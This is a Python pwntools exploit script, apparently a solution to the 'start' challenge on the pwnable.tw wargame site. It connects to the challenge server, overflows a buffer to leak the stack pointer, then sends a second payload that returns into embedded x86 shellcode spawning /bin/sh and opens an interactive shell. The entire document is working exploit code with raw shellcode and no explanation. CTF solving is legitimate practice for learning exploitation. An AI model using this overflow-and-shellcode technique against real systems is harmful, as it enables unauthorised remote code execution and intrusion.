from pwn import *

# io = process('./start')
# gdb.attach(io, api=True)
io = remote('chall.pwnable.tw', 10000)

shell = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
pad = b'a'*20
print_esp = 0x08048087

payload = pad + p32(print_esp)

print(io.recvuntil(b' CTF:'))
io.send(payload)
leak_esp = u32(io.recv(4))
print(hex(leak_esp))

payload = b'a'*20 + p32(leak_esp + 20) + shell
io.send(payload)

io.interactive()